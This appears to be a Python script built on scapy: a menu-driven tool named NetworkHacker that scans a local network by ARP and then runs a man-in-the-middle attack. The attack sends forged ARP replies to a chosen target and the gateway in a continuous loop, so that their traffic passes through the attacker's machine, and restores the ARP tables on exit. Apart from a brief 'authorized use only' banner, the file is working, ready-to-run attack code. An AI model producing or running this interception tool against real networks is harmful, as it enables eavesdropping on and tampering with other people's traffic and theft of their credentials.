import scapy.all as scapy
import time
import sys
import os


def get_mac(ip, retries=3):
    """Resolve MAC address for a given IP via ARP, with retries."""
    for attempt in range(1, retries + 1):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / arp_request
        answered = scapy.srp(broadcast, timeout=2, verbose=False)[0]
        if answered:
            return answered[0][1].hwsrc
        if attempt < retries:
            print(f"[!] MAC lookup for {ip} failed (attempt {attempt}/{retries}), retrying...")
            time.sleep(1)
    return None


class NetworkHacker:
    def __init__(self):
        self.target_ip = ""
        self.gateway_ip = ""
        self.target_mac = ""
        self.gateway_mac = ""

    def scan(self, ip_range):
        """Discover all devices on the network using ARP."""
        print(f"\n[+] Scanning network: {ip_range}...")

        arp_request = scapy.ARP(pdst=ip_range)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / arp_request

        try:
            answered_list = scapy.srp(broadcast, timeout=3, verbose=False)[0]
        except PermissionError:
            print("[!] Permission denied. Run with sudo.")
            return []
        except OSError as e:
            print(f"[!] Network error: {e}")
            return []

        devices = []
        for element in answered_list:
            devices.append({
                "ip": element[1].psrc,
                "mac": element[1].hwsrc,
            })

        print(f"[+] Found {len(devices)} devices:")
        for d in devices:
            print(f"    - IP: {d['ip']} | MAC: {d['mac']}")
        return devices

    def spoof(self, target_ip, target_mac, spoof_ip):
        """Send a forged ARP reply telling target_ip that spoof_ip lives at our MAC."""
        packet = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
        )
        scapy.send(packet, verbose=False)

    def restore(self, dest_ip, dest_mac, source_ip, source_mac):
        """Restore a correct ARP entry on dest_ip for source_ip."""
        packet = scapy.ARP(
            op=2,
            pdst=dest_ip,
            hwdst=dest_mac,
            psrc=source_ip,
            hwsrc=source_mac,
        )
        scapy.send(packet, count=6, verbose=False)

    def run_mitm(self, target_ip, gateway_ip):
        """Full MITM loop with MAC resolution, retry, and graceful restore."""
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip

        print(f"\n[+] Resolving MAC addresses...")
        self.target_mac = get_mac(target_ip)
        if not self.target_mac:
            print(f"[!] Could not resolve target {target_ip}. Aborting.")
            return

        self.gateway_mac = get_mac(gateway_ip)
        if not self.gateway_mac:
            print(f"[!] Could not resolve gateway {gateway_ip}. Aborting.")
            return

        print(f"[+] Target  {target_ip} -> {self.target_mac}")
        print(f"[+] Gateway {gateway_ip} -> {self.gateway_mac}")
        print(f"\n[+] Spoofing active. Press Ctrl+C to stop.\n")

        sent = 0
        consecutive_errors = 0
        max_errors = 5

        try:
            while True:
                try:
                    self.spoof(target_ip, self.target_mac, gateway_ip)
                    self.spoof(gateway_ip, self.gateway_mac, target_ip)
                    sent += 2
                    consecutive_errors = 0
                    print(f"\r[+] Packets sent: {sent}", end="", flush=True)
                except OSError as e:
                    consecutive_errors += 1
                    print(f"\n[!] Send error ({consecutive_errors}/{max_errors}): {e}")
                    if consecutive_errors >= max_errors:
                        print("[!] Too many consecutive failures. Stopping.")
                        break
                    time.sleep(2)
                    continue
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            self._graceful_restore()

    def _graceful_restore(self):
        """Restore ARP tables for both target and gateway."""
        print("\n\n[+] Restoring ARP tables...")
        try:
            self.restore(
                self.target_ip, self.target_mac,
                self.gateway_ip, self.gateway_mac,
            )
            self.restore(
                self.gateway_ip, self.gateway_mac,
                self.target_ip, self.target_mac,
            )
            print("[+] ARP tables restored successfully.")
        except OSError as e:
            print(f"[!] Restore failed: {e}")
            print("[!] Targets may need to clear their ARP cache manually.")


def main():
    if os.geteuid() != 0:
        print("[!] This tool requires root. Run with sudo.")
        sys.exit(1)

    print("--- Network Security Tool (authorized use only) ---\n")
    print("1. Scan Network")
    print("2. ARP Spoof (MITM)")
    choice = input("\nSelect mode: ").strip()

    hacker = NetworkHacker()

    if choice == "1":
        ip_range = input("Network range (e.g. 192.168.1.0/24): ").strip()
        if not ip_range:
            print("[!] No range provided.")
            return
        hacker.scan(ip_range)

    elif choice == "2":
        target = input("Target IP: ").strip()
        gateway = input("Gateway IP: ").strip()
        if not target or not gateway:
            print("[!] Both target and gateway IPs are required.")
            return
        hacker.run_mitm(target, gateway)

    else:
        print("[!] Invalid choice.")


if __name__ == "__main__":
    main()
